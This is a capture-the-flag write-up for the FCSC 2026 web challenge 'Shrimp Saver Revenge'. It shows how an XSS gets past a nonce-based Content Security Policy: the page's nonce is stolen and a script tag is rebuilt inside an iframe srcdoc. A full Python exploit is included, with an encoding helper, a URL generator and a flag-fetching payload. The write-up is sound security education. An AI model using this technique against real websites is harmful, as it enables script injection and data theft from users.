# Shrimp Saver Revenge

**Category:** Web
**Event:** FCSC 2026

## TL;DR

Same app, but `display_errors=Off` is now set so the PHP max_input_vars trick no longer works - CSP stays alive. Instead we steal the page's nonce using the same DOM copy primitive, then construct an iframe with `srcdoc` where we reassemble a `<script nonce="STOLEN">` tag from HTML-entity-encoded fragments split across multiple `<a>` elements. The nonce matches, CSP passes, script runs.

## What changed from Shrimp Saver

Only the php.ini was patched:

```ini
display_errors = Off
display_startup_errors = Off
log_errors = On
error_reporting = E_ALL
```

PHP still fires the `max_input_vars` warning internally, but with `display_errors=Off` it never reaches the response body. Headers get sent normally. CSP is back and there's no quirks mode trick anymore.

Everything else - the `copy` function, `resolvePath`, the blacklist - is identical.

## Recon

From the notes written during solving:

> download shrimp revenge and notice that the only fix is remove error on phps

The DOM copy primitive still works. We can still write any `document.body.*` path from another path. We just can't inject raw inline event handlers anymore because CSP requires a nonce.

The nonce is in the page: `<script nonce="abc123" src="/app.js">`. We can read it via `document.body.lastElementChild.nonce`. Can we use it?

Initial idea from the notes (manual JS exploration):

```javascript
document.body.children[0].innerHTML = '<iframe srcdoc="<p>alert(1)</p><script></script>"></iframe>';
document.body.children[0].lastElementChild.contentDocument.body.lastChild.nonce = document.body.lastElementChild.nonce;
document.body.children[0].lastElementChild.contentDocument.body.lastChild.textContent = ...
```

This was the exploration path: inject an iframe, set nonce on the script inside it from the parent's nonce, set the script content. The copy primitive can do this but through URL params, not JS.

## The technique - srcdoc nonce theft

The nonce from the parent page can be read: `document.body.lastElementChild.nonce` gives the nonce string.

We can write to `srcdoc` of an iframe we inject. If the srcdoc contains a `<script nonce="X">` and X matches the page nonce, Chrome allows execution even inside the iframe (same-origin srcdoc inherits parent CSP).

So the goal: build an iframe srcdoc that contains `<script nonce="STOLEN_NONCE">PAYLOAD</script>`.

Problem: we don't know the nonce at URL-generation time. But we can use the copy function to write it in at runtime.

## Building the nonce-bearing script via split fragments

We inject an HTML structure into `children.0.innerHTML` (via the hash/baseURI trick). The structure has three `<a>` tags and an `<iframe>`:

```html
<a><script/nonce='</a>
<a></a>           <!-- nonce value goes here at runtime -->
<a>'>PAYLOAD</script></a>
<iframe></iframe>
```

Steps using URL params (processed in order by the copy loop):

1. `children.0.innerHTML=ownerDocument.location.hash` - inject our HTML structure from the `#` fragment into `children.0`
2. `children.0.innerHTML=children.0.innerText` - decode HTML entities (same double-decode trick as before)
3. `children.0.children.1.innerText=lastElementChild.nonce` - write the page's actual nonce into the middle `<a>`
4. `children.0.lastChild.srcdoc=children.0.innerText` - set the iframe's srcdoc to the full text content of `children.0`

After step 3, `children.0.innerText` reads as:
```
<script/nonce='
abc123XYZ
'>fetch('/flag.php')...</script>
```

Setting that as the iframe's `srcdoc` makes the browser parse it. The `<script nonce='abc123XYZ'>` matches the page nonce, CSP allows it, payload runs.

## smart_html_encode

The injection fragments need double HTML-encoding to survive two rounds of parsing (once when set as innerHTML, once inside srcdoc). The `smart_html_encode` function from the exploit handles this:

```python
def smart_html_encode(input_str):
    def replace_attr(match):
        attr_name = match.group(1)
        quote = match.group(2)
        value = match.group(3)
        encoded_once = html.escape(value)
        encoded_twice = html.escape(encoded_once)
        return f'{attr_name}={quote}{encoded_twice}{quote}'

    processed = re.sub(r'(\w+)=("|\'')(.*?)(\2)', replace_attr, input_str)
    final = html.escape(processed).replace(' ', '&nbsp')
    return final
```

Encodes attribute values twice (they get decoded twice: once by the copy innerHTML step, once by srcdoc parsing) and encodes spaces as `&nbsp` to survive URL params.

## Full exploit

```python
import requests
import base64
import html
import re

URL = "http://0.0.0.0:8000/"

def smart_html_encode(input_str):
    def replace_attr(match):
        attr_name = match.group(1)
        quote = match.group(2)
        value = match.group(3)
        encoded_once = html.escape(value)
        encoded_twice = html.escape(encoded_once)
        return f'{attr_name}={quote}{encoded_twice}{quote}'

    processed = re.sub(r'(\w+)=("|\'')(.*?)(\2)', replace_attr, input_str)
    final = html.escape(processed).replace(' ', '&nbsp')
    return final


def xss_without_php(URL, injection_script):
    print(URL + "?children.0.innerHTML=ownerDocument.location.hash"
              + "&children.0.innerHTML=children.0.innerText"
              + "&children.0.children.1.innerText=lastElementChild.nonce"
              + "&children.0.lastChild.srcdoc=children.0.innerText"
              + "#" + injection_script)


payload = "fetch('/flag.php').then(r => r.text()).then(t => console.log('FLAAAAAAAAAAAAAAAAG : ', t));"

start_script_injection = smart_html_encode("<script/nonce='")
end_script_injection = smart_html_encode(f"'>{payload}</script>")

print(start_script_injection, end_script_injection)

injection_point = smart_html_encode(
    f"<a>{start_script_injection}</a><a></a><a>{end_script_injection}</a><iframe></iframe>"
)

xss_without_php("http://shrimp-saver-revenge/", injection_point)
```

The printed URL goes to the bot. The bot's console.log output (including `FLAAAAAAAAAAAAAAAAG : FCSC{...}`) comes back through the socket.

## Why children.0 and not children.35

In the original challenge we used `children.35` because the page had enough child elements to reach index 35. Revenge is the same page structure so it should also work, but the exploit uses `children.0` here since we're injecting from the hash (not baseURI) and we just need any writable child element to stage the fragments.

## Flag

`FCSC{...}`
